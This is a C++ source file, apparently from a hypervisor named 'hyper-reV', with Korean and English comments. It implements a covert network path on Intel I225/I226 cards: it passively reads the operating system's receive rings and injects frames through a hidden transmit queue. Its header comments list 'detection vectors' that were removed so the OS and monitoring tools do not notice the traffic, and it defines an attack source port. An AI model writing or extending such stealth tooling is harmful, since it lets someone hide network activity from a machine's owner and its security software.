#include "network.h"
#include "nic.h"
#include "packet.h"
#include "ip_frag.h"
#include "../dma/dma_handler.h"
#include "../dma/dma_protocol.h"
#include "../memory_manager/memory_manager.h"
#include "../memory_manager/heap_manager.h"
#include "../slat/slat.h"
#include "../slat/cr3/cr3.h"
#include "../crt/crt.h"

#include <immintrin.h>    // _mm_sfence(), _mm_clflush()
#include <intrin.h>       // __rdtsc()

// ============================================================================
// [핵심] hyper-reV 네트워크 모듈 - 읽기 전용 아키텍처
// ============================================================================
// RX (수신): 100% 읽기 전용!
//   - I225-V(igc): 4개 RX 큐 전부 폴링 (MRQC/RETA 수정 0)
//   - 큐별 buffer address 캐시 + RDT 추적 갱신
//   - NIC 레지스터 쓰기: 0회 (read_reg만 사용)
//
// TX (송신): 최소 변조
//   - TX Queue 1 전용 격리: hidden page 기반, OS Q0 완전 분리
//   - VA→PA 변환으로 hidden page GPA를 NIC Q1 레지스터에 등록
//   - TX stats 클리어 제거 (감지 벡터 제거)
//   - Q1 미초기화시 Q0 fallback (inject_tx_frame_intel_igc_q0_fallback)
//
// 감지 벡터 분석:
//   ✅ MRQC/RETA 레지스터 수정: 제거됨
//   ✅ TX stats 클리어: 제거됨
//   ✅ RSS 주기적 감시 write: 제거됨
//   ✅ OS TX Q0 TDT write: 제거됨 (Q1 TDT 0xE058 사용)
//   ✅ OS TX Q0 buffer 오염: 제거됨 (hidden page 사용)
// ============================================================================

namespace
{
    std::uint8_t* response_buffer = nullptr;
    std::uint32_t response_buffer_size = 0;
    std::uint8_t* tx_frame_buffer = nullptr;
    std::uint8_t* reasm_buffer = nullptr;

    std::uint32_t our_ip = 0;
    std::uint16_t our_src_port = 0;
    std::uint16_t attack_src_port = 0;
    cr3 cached_slat_cr3 = {};

    constexpr std::uint64_t POLL_INTERVAL_TSC = 0;
    std::uint64_t last_poll_tsc = 0;
    std::uint64_t poll_counter = 0;

    inline std::uint64_t read_tsc()
    {
        return __rdtsc();
    }

    // ========================================================================
    // Deferred TX State Machine
    // ========================================================================
    // [TX PACING DISABLED] Testing: all 91 chunks in 1 VMEXIT, single commit.
    constexpr std::uint32_t MAX_CHUNKS_PER_EXIT = 100;

    struct deferred_tx_state_t
    {
        std::uint8_t  active;
        std::uint32_t next_chunk;
        std::uint32_t total_chunks;
        std::uint32_t payload_size;
        std::uint32_t response_seq;
        std::uint32_t chunks_sent_ok;
        std::uint64_t start_tsc;
    };
    deferred_tx_state_t deferred_tx = {};
    std::uint32_t deferred_tx_seq_counter = 0;

    // [핵심] Deferred TX stale timeout
    // 클라이언트가 죽으면 응답을 계속 보내봤자 의미 없음
    // 정상 전송: 722 chunks / 100 per exit × 15ms = ~120ms
    // CPU clock 변동 고려 (3-5GHz):
    //   5B TSC @ 3GHz = 1.67초, @ 5GHz = 1.0초
    // → 정상 전송(120ms)에 절대 간섭 안 하면서 클라이언트 사망은 감지
    constexpr std::uint64_t DEFERRED_TX_TIMEOUT_TSC = 5000000000ULL;
}

// ============================================================================
// NIC Register R/W — MMIO only (Intel I225-V)
// ============================================================================

std::uint32_t nic::read_reg(const void* slat_cr3_ptr, const std::uint32_t offset)
{
    // [MMIO Bypass] Protected page -> direct host PA access (no NPT walk)
    // Hot path: tx_commit reads TDT on 0xE000 page every packet.
    // Without bypass, NPT present=0 -> map_guest_physical returns nullptr -> silent fail.
    // With bypass, map_host_physical(real HW PA) -> always succeeds.
    if (mmio_bypass_active)
    {
        const std::uint64_t gpa = state.mmio_base_gpa + offset;
        if ((gpa & ~0xFFFull) == mmio_bypass_page_gpa)
        {
            const std::uint64_t host_pa = mmio_bypass_host_pa + (gpa & 0xFFF);
            const auto* ptr = static_cast<const volatile std::uint32_t*>(
                memory_manager::map_host_physical(host_pa));
            return ptr ? *ptr : 0;
        }
    }

    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);
    const auto* ptr = static_cast<const volatile std::uint32_t*>(
        memory_manager::map_guest_physical(slat, state.mmio_base_gpa + offset));
    return ptr ? *ptr : 0;
}

void nic::write_reg(const void* slat_cr3_ptr, const std::uint32_t offset, const std::uint32_t value)
{
    // [MMIO Bypass] Protected page -> direct host PA access (no NPT walk)
    // Critical: tx_commit() writes TDT1(0xE058) every packet.
    // Without bypass, NPT present=0 -> write silently dropped -> NIC never sends.
    if (mmio_bypass_active)
    {
        const std::uint64_t gpa = state.mmio_base_gpa + offset;
        if ((gpa & ~0xFFFull) == mmio_bypass_page_gpa)
        {
            const std::uint64_t host_pa = mmio_bypass_host_pa + (gpa & 0xFFF);
            auto* ptr = static_cast<volatile std::uint32_t*>(
                memory_manager::map_host_physical(host_pa));
            if (ptr) *ptr = value;
            return;
        }
    }

    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);
    auto* ptr = static_cast<volatile std::uint32_t*>(
        memory_manager::map_guest_physical(slat, state.mmio_base_gpa + offset));
    if (ptr) *ptr = value;
}

std::uint8_t nic::read_reg8(const void* slat_cr3_ptr, const std::uint32_t offset)
{
    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);
    const auto* ptr = static_cast<const volatile std::uint8_t*>(
        memory_manager::map_guest_physical(slat, state.mmio_base_gpa + offset));
    return ptr ? *ptr : 0;
}

void nic::write_reg8(const void* slat_cr3_ptr, const std::uint32_t offset, const std::uint8_t value)
{
    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);
    auto* ptr = static_cast<volatile std::uint8_t*>(
        memory_manager::map_guest_physical(slat, state.mmio_base_gpa + offset));
    if (ptr) *ptr = value;
}

// ============================================================================
// NIC Discovery - Intel I225/I226 ONLY
// ============================================================================
// [NIC SELECT] Auto-detect add-in PCIe card vs onboard NIC.
//
// Problem: "highest bus" heuristic fails when onboard has higher bus.
//   Example: onboard=bus 11, add-in=bus 9 → highest picks onboard (WRONG).
//
// Solution: Check parent PCIe Root Port's "Slot Implemented" bit.
//   - Onboard NIC → parent root port: Slot Implemented = 0
//   - Add-in NIC  → parent root port: Slot Implemented = 1
//   This is a hardware property, always reliable regardless of bus numbering.
//
// Selection priority:
//   1. I225/I226 behind a physical PCIe slot (add-in card)
//   2. If no slot NIC found, fall back to highest bus (original behavior)
// ============================================================================

// Check if a given bus is behind a PCIe root port with a physical slot.
// Walks bus 0 bridges → finds parent root port → checks Slot Implemented bit.
std::uint8_t nic::discover_nic(const void* slat_cr3_ptr)
{
    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);

    // 디버그 카운터 리셋

    // ECAM base 탐지
    if (ecam_base_detected == 0)
    {
        for (std::uint32_t i = 0; i < ECAM_CANDIDATE_COUNT; i++)
        {
            const std::uint64_t test_gpa = ECAM_CANDIDATES[i] + PCI_VENDOR_ID;
            const auto* test_ptr = static_cast<const std::uint16_t*>(
                memory_manager::map_guest_physical(slat, test_gpa));
            if (!test_ptr) continue;

            const std::uint16_t test_vid = *test_ptr;
            if (test_vid != 0xFFFF && test_vid != 0x0000)
            {
                ecam_base_detected = ECAM_CANDIDATES[i];
                break;
            }
        }
        if (ecam_base_detected == 0) return 0;
    }

    // [NIC SELECT] Scan for Intel I225/I226, select by MAC or highest-bus fallback
    std::uint8_t  best_bus = 0;
    std::uint8_t  best_dev = 0;
    std::uint8_t  best_func = 0;
    std::uint16_t best_did = 0;
    std::uint64_t best_mmio = 0;
    std::uint8_t  found = 0;
    std::uint8_t  bus_found = 0;  // 1 if exact config bus match found

    for (std::uint8_t bus = 0; bus < 32; bus++)
    {
        for (std::uint8_t dev = 0; dev < 32; dev++)
        {
            for (std::uint8_t func = 0; func < 8; func++)
            {
                const std::uint64_t vid_gpa = ecam_address(bus, dev, func, PCI_VENDOR_ID);
                const auto* vid_ptr = static_cast<const std::uint16_t*>(
                    memory_manager::map_guest_physical(slat, vid_gpa));
                if (!vid_ptr) continue;

                const std::uint16_t vendor_id = *vid_ptr;
                if (vendor_id == 0xFFFF || vendor_id == 0x0000) continue;


                // [핵심] Intel만 허용
                if (vendor_id != INTEL_VENDOR_ID) continue;

                // Device ID 읽기
                const std::uint64_t did_gpa = ecam_address(bus, dev, func, PCI_DEVICE_ID);
                const auto* did_ptr = static_cast<const std::uint16_t*>(
                    memory_manager::map_guest_physical(slat, did_gpa));
                if (!did_ptr) continue;

                const std::uint16_t device_id = *did_ptr;

                // [핵심] I225/I226 계열만 허용 (igc 드라이버)
                if (!is_igc_nic(device_id)) continue;

                // Class code 확인
                const std::uint64_t class_gpa = ecam_address(bus, dev, func, 0x0B);
                const auto* class_ptr = static_cast<const std::uint8_t*>(
                    memory_manager::map_guest_physical(slat, class_gpa));
                if (!class_ptr) continue;

                const std::uint64_t subclass_gpa = ecam_address(bus, dev, func, 0x0A);
                const auto* subclass_ptr = static_cast<const std::uint8_t*>(
                    memory_manager::map_guest_physical(slat, subclass_gpa));
                if (!subclass_ptr) continue;


                if (*class_ptr != PCI_CLASS_NETWORK || *subclass_ptr != PCI_SUBCLASS_ETHERNET)
                {
                    continue;
                }

                // BAR0 (MMIO) — Intel I225-V는 BAR0=MMIO (64-bit)
                const std::uint64_t bar0_gpa = ecam_address(bus, dev, func, PCI_BAR0);
                const auto* bar0_ptr = static_cast<const std::uint32_t*>(
                    memory_manager::map_guest_physical(slat, bar0_gpa));
                if (!bar0_ptr) continue;

                std::uint32_t bar_low = *bar0_ptr;

                // BAR0 bit0=1 → I/O space → Intel MMIO 아님, skip
                if (bar_low & 1) continue;

                std::uint64_t mmio_base = bar_low & 0xFFFFFFF0;

                // 64-bit BAR 체크: bit[2:1] = 10b → 64-bit
                if (((bar_low >> 1) & 3) == 2) {
                    const std::uint64_t bar1_gpa = ecam_address(bus, dev, func, PCI_BAR1);
                    const auto* bar1_ptr = static_cast<const std::uint32_t*>(
                        memory_manager::map_guest_physical(slat, bar1_gpa));
                    if (bar1_ptr)
                        mmio_base |= (static_cast<std::uint64_t>(*bar1_ptr) << 32);
                }

                if (mmio_base == 0 || mmio_base == 0xFFFFFFF0) continue;


                // NIC selection: config bus has priority
                // If boot_target_bus set via hvnic.cfg, exact bus match wins.
                // Otherwise fallback = highest bus number.
                std::uint8_t take_this = 0;
                if (nic::boot_target_bus_set && bus == nic::boot_target_bus) {
                    take_this = 1;
                    bus_found = 1;
                }
                else if (!bus_found) {
                    // No config bus match yet: auto-select by highest bus
                    if (!found) {
                        take_this = 1;
                    }
                    else if (bus > best_bus ||
                        (bus == best_bus && dev > best_dev) ||
                        (bus == best_bus && dev == best_dev && func > best_func)) {
                        take_this = 1;
                    }
                }

                if (take_this)
                {
                    best_bus = bus;
                    best_dev = dev;
                    best_func = func;
                    best_did = device_id;
                    best_mmio = mmio_base;
                    found = 1;
                }

            }
        }
    }

    if (!found) return 0;

    state.bus = best_bus;
    state.dev = best_dev;
    state.func = best_func;
    state.vendor_id = INTEL_VENDOR_ID;
    state.device_id = best_did;
    state.mmio_base_gpa = best_mmio;
    state.nic_type = nic_type_t::INTEL;
    state.intel_gen = intel_gen_t::IGC;  // I225/I226 = igc


    // ================================================================
    // CMD 활성화 — Bus Master + Memory Space
    // ================================================================
    {
        const std::uint16_t pci_cmd = pci_cf8_read16(best_bus, best_dev, best_func, 0x04);

        if ((pci_cmd & 0x0006) != 0x0006)
        {
            pci_cf8_write16(best_bus, best_dev, best_func, 0x04,
                pci_cmd | 0x0006);
            for (volatile int delay = 0; delay < 5000000; delay++) {}
        }
    }

    return 1;
}

// ============================================================================
// Ring Config
// ============================================================================

std::uint8_t nic::read_ring_config(const void* slat_cr3_ptr)
{
    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);

    if (state.nic_type == nic_type_t::INTEL)
    {
        // [핵심] igc vs e1000e: 올바른 레지스터 오프셋 사용
        const std::uint32_t rdbal = read_reg(slat_cr3_ptr, reg_rdbal(state));
        const std::uint32_t rdbah = read_reg(slat_cr3_ptr, reg_rdbah(state));
        const std::uint32_t rdlen = read_reg(slat_cr3_ptr, reg_rdlen(state));
        state.rx_ring_gpa = (static_cast<std::uint64_t>(rdbah) << 32) | rdbal;
        state.rx_ring_len = rdlen;
        state.rx_count = rdlen / sizeof(intel_rx_desc_t); // 16B per desc

        const std::uint32_t tdbal = read_reg(slat_cr3_ptr, reg_tdbal(state));
        const std::uint32_t tdbah = read_reg(slat_cr3_ptr, reg_tdbah(state));
        const std::uint32_t tdlen = read_reg(slat_cr3_ptr, reg_tdlen(state));
        state.tx_ring_gpa = (static_cast<std::uint64_t>(tdbah) << 32) | tdbal;
        state.tx_ring_len = tdlen;
        state.tx_count = tdlen / sizeof(intel_tx_desc_t);

        if (state.rx_ring_gpa == 0 || state.rx_count == 0) return 0;

        // [FIX] TX Q0 not ready at early boot is OK.
        // HV uses independent Q1 hidden page ring (setup_igc_hv_tx_queue).
        // Q0 fallback path checks tx_count==0 and returns 0 gracefully.
        // Do NOT fail init just because OS igc driver hasn't configured Q0 yet.
        // if (state.tx_ring_gpa == 0 || state.tx_count == 0) return 0;

        // [핵심] RDH는 반드시 올바른 오프셋에서 읽어야 함!
        state.our_rx_index = read_reg(slat_cr3_ptr, reg_rdh(state));
        state.our_tx_index = 0;

        // [핵심] igc인 경우 SRRCTL로 advanced descriptor 여부 확인
        if (state.intel_gen == intel_gen_t::IGC)
        {
            const std::uint32_t srrctl = read_reg(slat_cr3_ptr, IGC_REG_SRRCTL);
            const std::uint32_t desctype = srrctl & IGC_SRRCTL_DESCTYPE_MASK;
            state.use_adv_desc = (desctype != IGC_SRRCTL_DESCTYPE_LEGACY) ? 1 : 0;

            // advanced descriptor면 buffer address 캐싱
            if (state.use_adv_desc)
                cache_rx_buf_addrs(slat_cr3_ptr);
        }
        else
        {
            state.use_adv_desc = 0;
        }
    }

    return (state.rx_ring_gpa != 0) ? 1 : 0;
}

void nic::read_mac(const void* slat_cr3_ptr)
{
    if (state.nic_type == nic_type_t::INTEL)
    {
        const std::uint32_t ral = read_reg(slat_cr3_ptr, INTEL_REG_RAL0);
        const std::uint32_t rah = read_reg(slat_cr3_ptr, INTEL_REG_RAH0);
        state.mac[0] = static_cast<std::uint8_t>(ral);
        state.mac[1] = static_cast<std::uint8_t>(ral >> 8);
        state.mac[2] = static_cast<std::uint8_t>(ral >> 16);
        state.mac[3] = static_cast<std::uint8_t>(ral >> 24);
        state.mac[4] = static_cast<std::uint8_t>(rah);
        state.mac[5] = static_cast<std::uint8_t>(rah >> 8);
    }
}

// ============================================================================
// [핵심] RX Buffer Address Cache (igc advanced descriptor용)
// ============================================================================
// Advanced write-back에서 buffer_addr가 RSS hash로 덮어써지므로
// 드라이버가 write한 read format에서 pkt_addr를 미리 캐싱
// ============================================================================

void nic::cache_rx_buf_addrs(const void* slat_cr3_ptr)
{
    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);
    const std::uint32_t count = state.rx_count;
    if (count == 0 || count > MAX_RX_BUF_CACHE) return;

    // [핵심] 전체 ring 스캔해서 buffer address 캐싱
    // 아직 NIC가 처리하지 않은 descriptor는 read format (pkt_addr 유효)
    // 이미 처리된 descriptor는 write-back (pkt_addr = RSS hash = 무효)
    // → RDT~RDH 사이의 "available" descriptor에서만 유효한 주소를 얻을 수 있음
    // → 나머지는 드라이버가 recycle할 때 다시 read format으로 써줌

    // 현재 RDT 읽기 (드라이버가 NIC에 제공한 마지막 descriptor)
    const std::uint32_t rdt = read_reg(slat_cr3_ptr, reg_rdt(state));
    const std::uint32_t rdh = read_reg(slat_cr3_ptr, reg_rdh(state));

    for (std::uint32_t i = 0; i < count; i++)
    {
        const std::uint64_t desc_gpa = state.rx_ring_gpa + i * 16;

        // [핵심 버그 수정] DD 체크: WB format의 rss_hash를 pkt_addr로 오인 방지
        const auto* wb = static_cast<const igc_rx_desc_wb_t*>(
            memory_manager::map_guest_physical(slat, desc_gpa));
        if (!wb) continue;

        if (wb->staterr & IGC_RXD_STAT_DD) {
            // NIC 처리 완료 → WB format → pkt_addr 위치에 RSS hash
            rx_buf_cache[i] = 0;
            continue;
        }

        // DD=0 → READ format → pkt_addr 유효
        const auto* desc_read = static_cast<const igc_rx_desc_read_t*>(
            memory_manager::map_guest_physical(slat, desc_gpa));
        if (!desc_read) continue;

        const std::uint64_t addr = desc_read->pkt_addr;
        if (addr != 0 && addr < 0x0000FFFFFFFFFFFF)
            rx_buf_cache[i] = addr;
        else
            rx_buf_cache[i] = 0;
    }

    rx_buf_cache_valid = 1;
}

// ============================================================================
// [핵심] RX Buffer Cache 갱신 - 드라이버가 recycle한 descriptor 추적
// ============================================================================
// 드라이버가 RDT를 업데이트하면 그 사이의 descriptor는 새로운
// read format으로 써져있으므로 buffer address를 다시 캐싱
// ============================================================================

static std::uint32_t last_known_rdt = 0;

static void refresh_rx_buf_cache_igc()
{
    const cr3 slat = cached_slat_cr3;
    const std::uint32_t rdt = nic::read_reg(&slat, nic::reg_rdt(nic::state));

    if (rdt == last_known_rdt) return; // 변경 없음

    // RDT가 전진한 범위의 descriptor만 업데이트
    std::uint32_t idx = last_known_rdt;
    const std::uint32_t count = nic::state.rx_count;
    std::uint32_t updated = 0;

    while (idx != rdt && updated < count)
    {
        const std::uint64_t desc_gpa = nic::state.rx_ring_gpa + idx * 16;

        // [핵심 버그 수정] DD=0 확인 → READ format만 캐싱
        // DD=1이면 NIC가 이미 WB format으로 변환 → rss_hash를 pkt_addr로 오인
        const auto* wb = static_cast<const nic::igc_rx_desc_wb_t*>(
            memory_manager::map_guest_physical(slat, desc_gpa));

        if (wb && !(wb->staterr & nic::IGC_RXD_STAT_DD))
        {
            const auto* desc_read = static_cast<const nic::igc_rx_desc_read_t*>(
                memory_manager::map_guest_physical(slat, desc_gpa));

            if (desc_read)
            {
                const std::uint64_t addr = desc_read->pkt_addr;
                if (addr != 0 && addr < 0x0000FFFFFFFFFFFF && idx < nic::MAX_RX_BUF_CACHE)
                    nic::rx_buf_cache[idx] = addr;
            }
        }

        idx = (idx + 1) % count;
        updated++;
    }

    last_known_rdt = rdt;
}

// ============================================================================
// [핵심] IGC 멀티큐 RX 지원 - 읽기 전용 (NIC 레지스터 수정 0!)
// ============================================================================
// I225-V는 RSS로 4개 RX 큐에 패킷 분배. Queue 0만 읽으면 누락 발생.
// MRQC/RETA 수정하지 않고 4개 큐 전부 폴링하여 해결.
// ============================================================================

// IGC Queue 1~3 초기화 (Queue 0는 기존 read_ring_config에서 처리)
std::uint8_t nic::read_igc_multi_queue_config(const void* slat_cr3_ptr)
{
    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);
    igc_num_active_queues = 0;

    for (std::uint32_t q = 0; q < IGC_MAX_RX_QUEUES; q++)
    {
        const std::uint32_t rdbal = read_reg(slat_cr3_ptr, igc_rxq_rdbal(q));
        const std::uint32_t rdbah = read_reg(slat_cr3_ptr, igc_rxq_rdbah(q));
        const std::uint32_t rdlen = read_reg(slat_cr3_ptr, igc_rxq_rdlen(q));

        const std::uint64_t ring_gpa = (static_cast<std::uint64_t>(rdbah) << 32) | rdbal;
        const std::uint32_t desc_count = rdlen / 16; // 16B per descriptor

        igc_rxq[q].ring_gpa = ring_gpa;
        igc_rxq[q].count = desc_count;
        igc_rxq[q].active = (ring_gpa != 0 && desc_count > 0) ? 1 : 0;
        igc_rxq[q].buf_cache_valid = 0;

        if (igc_rxq[q].active)
        {
            // 현재 RDH를 시작점으로 설정 (이미 처리된 패킷 스킵)
            igc_rxq[q].our_index = read_reg(slat_cr3_ptr, igc_rxq_rdh(q));
            igc_rxq[q].last_known_rdt = read_reg(slat_cr3_ptr, igc_rxq_rdt(q));
            igc_num_active_queues++;

            // buffer address 캐싱
            cache_igc_queue_buf_addrs(slat_cr3_ptr, q);
        }
    }

    return (igc_num_active_queues > 0) ? 1 : 0;
}

// 큐별 buffer address 캐싱
void nic::cache_igc_queue_buf_addrs(const void* slat_cr3_ptr, std::uint32_t queue_idx)
{
    if (queue_idx >= IGC_MAX_RX_QUEUES) return;
    const auto& rxq = igc_rxq[queue_idx];
    if (!rxq.active || rxq.count == 0 || rxq.count > MAX_RXQ_BUF_CACHE) return;

    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);

    for (std::uint32_t i = 0; i < rxq.count; i++)
    {
        const std::uint64_t desc_gpa = rxq.ring_gpa + i * 16;

        // [핵심 버그 수정] DD=0만 READ format → pkt_addr 유효
        // DD=1이면 WB format → rss_hash가 pkt_addr 위치에 있음
        const auto* wb = static_cast<const igc_rx_desc_wb_t*>(
            memory_manager::map_guest_physical(slat, desc_gpa));
        if (!wb) continue;

        if (wb->staterr & nic::IGC_RXD_STAT_DD) {
            // WB format - pkt_addr 읽을 수 없음, 0으로 표시
            igc_rxq_buf_cache[queue_idx][i] = 0;
            continue;
        }

        // DD=0 → READ format → pkt_addr 안전
        const auto* desc_read = static_cast<const igc_rx_desc_read_t*>(
            memory_manager::map_guest_physical(slat, desc_gpa));
        if (!desc_read) continue;

        const std::uint64_t addr = desc_read->pkt_addr;
        if (addr != 0 && addr < 0x0000FFFFFFFFFFFF)
            igc_rxq_buf_cache[queue_idx][i] = addr;
        else
            igc_rxq_buf_cache[queue_idx][i] = 0;
    }

    igc_rxq[queue_idx].buf_cache_valid = 1;
}

// 큐별 buffer cache 갱신 (RDT 변경 추적)
void nic::refresh_igc_queue_buf_cache(const void* slat_cr3_ptr, std::uint32_t queue_idx)
{
    if (queue_idx >= IGC_MAX_RX_QUEUES) return;
    auto& rxq = igc_rxq[queue_idx];
    if (!rxq.active || !rxq.buf_cache_valid) return;

    const cr3 slat = *static_cast<const cr3*>(slat_cr3_ptr);
    const std::uint32_t rdt = read_reg(slat_cr3_ptr, igc_rxq_rdt(queue_idx));

    if (rdt == rxq.last_known_rdt) return;

    std::uint32_t idx = rxq.last_known_rdt;
    std::uint32_t updated = 0;

    while (idx != rdt && updated < rxq.count)
    {
        const std::uint64_t desc_gpa = rxq.ring_gpa + idx * 16;

        // [핵심 버그 수정] DD 비트 먼저 확인!
        // NIC가 이미 처리한 descriptor는 WB format이라
        // 첫 8바이트가 rss_hash+info로 변환됨 (pkt_addr 아님!)
        // DD=0인 경우에만 READ format이 보장됨 → pkt_addr 정상
        const auto* wb = static_cast<const igc_rx_desc_wb_t*>(
            memory_manager::map_guest_physical(slat, desc_gpa));

        if (wb && !(wb->staterr & IGC_RXD_STAT_DD))
        {
            // DD=0 → READ format → pkt_addr 유효
            const auto* desc_read = static_cast<const igc_rx_desc_read_t*>(
                memory_manager::map_guest_physical(slat, desc_gpa));

            if (desc_read)
            {
                const std::uint64_t addr = desc_read->pkt_addr;
                if (addr != 0 && addr < 0x0000FFFFFFFFFFFF && idx < MAX_RXQ_BUF_CACHE)
                    igc_rxq_buf_cache[queue_idx][idx] = addr;
            }
        }
        // DD=1 → WB format → 기존 캐시 유지 (덮어쓰지 않음!)

        idx = (idx + 1) % rxq.count;
        updated++;
    }

    rxq.last_known_rdt = rdt;
}

// ============================================================================
// TX Frame Injection - Intel (e1000e legacy)
// ============================================================================

static std::uint8_t inject_tx_frame_intel_legacy(
    const std::uint8_t* raw_frame,
    const std::uint32_t frame_len)
{
    const cr3 slat = cached_slat_cr3;
    const std::uint32_t tx_count = nic::state.tx_count;
    if (tx_count == 0) return 0;

    const std::uint32_t tdt = nic::read_reg(&slat, nic::reg_tdt(nic::state));
    std::uint32_t tdh = nic::read_reg(&slat, nic::reg_tdh(nic::state));
    const std::uint32_t next_tdt = (tdt + 1) % tx_count;

    if (next_tdt == tdh) {
        constexpr std::uint32_t MAX_DRAIN_POLLS = 1000;
        for (std::uint32_t spin = 0; spin < MAX_DRAIN_POLLS; spin++) {
            tdh = nic::read_reg(&slat, nic::reg_tdh(nic::state));
            if (next_tdt != tdh) break;
        }
        if (next_tdt == tdh) {
            network::packets_dropped++;
            return 0;
        }
    }

    const std::uint64_t desc_gpa = nic::state.tx_ring_gpa + tdt * sizeof(nic::intel_tx_desc_t);
    auto* desc = static_cast<nic::intel_tx_desc_t*>(
        memory_manager::map_guest_physical(slat, desc_gpa));
    if (!desc) return 0;

    if (desc->buffer_addr == 0) {
        network::packets_dropped++;
        return 0;
    }
    if (!(desc->status & nic::INTEL_TX_STATUS_DD) && desc->cmd != 0) {
        network::packets_dropped++;
        return 0;
    }

    auto* buf = static_cast<std::uint8_t*>(
        memory_manager::map_guest_physical(slat, desc->buffer_addr));
    if (!buf) return 0;

    crt::copy_memory(buf, raw_frame, frame_len);

    desc->length = static_cast<std::uint16_t>(frame_len);
    desc->cmd = nic::INTEL_TX_CMD_EOP | nic::INTEL_TX_CMD_IFCS | nic::INTEL_TX_CMD_RS;
    desc->status = 0;
    desc->cso = 0;
    desc->css = 0;
    desc->special = 0;

    _mm_sfence();
    nic::write_reg(&slat, nic::reg_tdt(nic::state), next_tdt);

    constexpr std::uint32_t MAX_TX_WAIT = 10000;
    for (std::uint32_t i = 0; i < MAX_TX_WAIT; i++) {
        if (desc->status & nic::INTEL_TX_STATUS_DD) break;
    }

    // [핵심] TX stats 클리어 제거 - 레지스터 변조 감지 벡터였음
    // e1000e legacy: Q1 격리 미적용 (IGC 전용). Q0 사용 유지.
    return 1;
}

// ============================================================================
// [핵심] TX Queue 1 초기화 - OS Queue 0과 완전 격리된 전용 TX 경로
// ============================================================================
// 구조:
//   hidden page 1: TX descriptor ring (256 desc × 16B = 4KB)
//   hidden page 2: TX data buffer (1 frame, 4KB)
//   모든 descriptor의 buffer_addr → data buffer GPA
//   NIC TX Q1 레지스터: TDBAL/TDBAH=ring GPA, TDLEN=4096, TXDCTL.ENABLE=1
//
// 이점:
//   ✅ OS TX Q0 TDT 변경: 0 (우리는 Q1 TDT만 사용)
//   ✅ OS TX 버퍼 덮어쓰기: 0 (우리 전용 hidden page)
//   ✅ OS TX ring 오염: 0 (별도 descriptor ring)
//   ✅ TX stats: OS Q0과 Q1 통계 혼재되지만 클리어 불필요
// ============================================================================

std::uint8_t nic::setup_igc_hv_tx_queue(const void* slat_cr3_ptr)
{
    if (!heap_va_pa_valid) return 0;

    // ========================================================================
    // [DPDK-style] 128 descriptors + 128 independent 2KB buffers
    // ========================================================================
    // desc ring: 128 × 16B = 2048B → 1 page (나머지 공간 미사용)
    // data bufs: 128 × 2KB  = 256KB → 64 pages (연속 할당)
    // 각 descriptor가 고유 buffer를 가리킴 → DD wait 없이 batch enqueue
    // ========================================================================
    constexpr std::uint32_t DESC_COUNT = BATCH_TX_RING_SIZE;  // 128

    if (!igc_hv_tx.desc_ring_va)
    {
        // Descriptor ring: 1 page
        void* desc_page = heap_manager::allocate_page();
        if (!desc_page) return 0;

        igc_hv_tx.desc_ring_gpa = va_to_gpa(desc_page);
        igc_hv_tx.desc_ring_va = desc_page;
        igc_hv_tx.desc_count = DESC_COUNT;

        // Per-slot data buffers: 각 2KB, 연속 페이지에서 2개씩
        // 1 page (4KB) = 2 slots × 2KB
        // 128 slots → 64 pages 필요
        constexpr std::uint32_t SLOTS_PER_PAGE = 2;
        constexpr std::uint32_t PAGES_NEEDED = DESC_COUNT / SLOTS_PER_PAGE;  // 64

        for (std::uint32_t p = 0; p < PAGES_NEEDED; p++)
        {
            void* page = heap_manager::allocate_page();
            if (!page) return 0;

            std::uint64_t page_gpa = va_to_gpa(page);

            // slot A = page + 0, slot B = page + 2048
            std::uint32_t slot_a = p * SLOTS_PER_PAGE;
            std::uint32_t slot_b = slot_a + 1;

            igc_hv_tx.buf_va[slot_a] = static_cast<std::uint8_t*>(page);
            igc_hv_tx.buf_gpa[slot_a] = page_gpa;
            igc_hv_tx.buf_va[slot_b] = static_cast<std::uint8_t*>(page) + BATCH_TX_BUF_SIZE;
            igc_hv_tx.buf_gpa[slot_b] = page_gpa + BATCH_TX_BUF_SIZE;
        }
    }

    // Ring 초기화: 모든 descriptor DD=1 (사용 가능 표시)
    crt::set_memory(igc_hv_tx.desc_ring_va, 0, 0x1000);
    auto* ring = static_cast<igc_tx_desc_t*>(igc_hv_tx.desc_ring_va);
    for (std::uint32_t i = 0; i < DESC_COUNT; i++)
    {
        ring[i].buffer_addr = igc_hv_tx.buf_gpa[i];
        ring[i].cmd_type_len = 0;
        ring[i].olinfo_status = IGC_TXD_STAT_DD;  // 초기: "완료됨" = 사용 가능
    }

    // SW pointers 초기화
    igc_hv_tx.sw_tail = 0;
    igc_hv_tx.sw_head = 0;
    igc_hv_tx.nb_tx_free = DESC_COUNT - 1;  // ring-1 규칙

    // NIC TX Queue 1 레지스터 프로그래밍
    const std::uint64_t desc_gpa = igc_hv_tx.desc_ring_gpa;
    write_reg(slat_cr3_ptr, IGC_TXQ1_TDBAL, static_cast<std::uint32_t>(desc_gpa & 0xFFFFFFFF));
    write_reg(slat_cr3_ptr, IGC_TXQ1_TDBAH, static_cast<std::uint32_t>(desc_gpa >> 32));
    write_reg(slat_cr3_ptr, IGC_TXQ1_TDLEN, DESC_COUNT * sizeof(igc_tx_desc_t));
    write_reg(slat_cr3_ptr, IGC_TXQ1_TDH, 0);
    write_reg(slat_cr3_ptr, IGC_TXQ1_TDT, 0);

    // Queue Enable + WTHRESH=1
    constexpr std::uint32_t TXDCTL_VAL = IGC_TXDCTL_ENABLE | (1u << 16);
    write_reg(slat_cr3_ptr, IGC_TXQ1_TXDCTL, TXDCTL_VAL);

    std::uint32_t txdctl_final = 0;
    for (std::uint32_t i = 0; i < 1000; i++)
    {
        txdctl_final = read_reg(slat_cr3_ptr, IGC_TXQ1_TXDCTL);
        if (txdctl_final & IGC_TXDCTL_ENABLE) break;
    }

    igc_hv_tx.initialized = 1;
    return 1;
}

// ============================================================================
// [FIX] TX ring 리셋 - OPEN 수신 시 호출
// ============================================================================
// ============================================================================
// ============================================================================
// [v4 stable] TX ring 리셋 — 단순 TXDCTL toggle + desc reinit
// ============================================================================
